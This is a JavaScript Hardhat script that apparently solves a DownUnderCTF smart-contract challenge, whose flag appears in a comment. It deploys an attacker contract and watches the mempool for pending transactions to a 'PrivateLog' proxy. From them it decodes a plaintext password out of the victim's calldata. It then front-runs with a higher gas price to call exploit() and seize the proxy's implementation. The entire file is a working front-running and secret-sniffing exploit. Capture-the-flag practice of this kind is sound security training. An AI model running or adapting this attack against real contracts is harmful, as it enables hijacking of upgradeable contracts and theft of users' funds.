const { ethers } = require('hardhat');

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  const [attackerAcc] = await ethers.getSigners();
  
  console.log("Beginning setup...");
  const privateLog = await ethers.getContractAt("PrivateLog", "0x6189762f79de311B49a7100e373bAA97dc3F4bd0");
  const Attacker = await ethers.getContractFactory("PrivateLogAttacker");
  console.log("Deploying Attacker...");
  const attacker = await Attacker.deploy();
  await attacker.deployed();
  // const attacker = await ethers.getContractAt("PrivateLogAttacker", "0x49197C22F76d572453e0ba06B7853B20d71e49a5")
  console.log("attacker deployed at:", attacker.address);
  console.log("Setup complete.");
  console.log("--");

  const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  // ---------------------------------------------------------------------------------------------------------------

  console.log({
    initialImplementation: await ethers.provider.getStorageAt(privateLog.address, IMPLEMENTATION_SLOT)
  });

  let actionTaken = false;
  ethers.provider.on("pending", async (tx) => {
    if(!actionTaken) {
      actionTaken = true;
      console.log("Caught tx " + tx.hash);
      const txData = tx.data;
      const decoded = ethers.utils.defaultAbiCoder.decode(
        ["string logEntry", "string password", "bytes32 newHash"],
        ethers.utils.hexDataSlice(txData, 4) // strip function sig
      );
      const password = decoded.password;
      console.log("Password: " + password);
      console.log("Attempting to front-run...");

      const ataccTx = await attacker.connect(attackerAcc).exploit(privateLog.address, password, {
        gasPrice: 4200000000
      });
      console.log("Tx in mempool: " + ataccTx.hash)
      await ataccTx.wait();
      console.log("think it worked?");
    }
  });

  while(true) {
    await sleep(60 * 1000);
  }
  

  // await attacker.exploit(privateLog.address, password);
  // DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds}
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });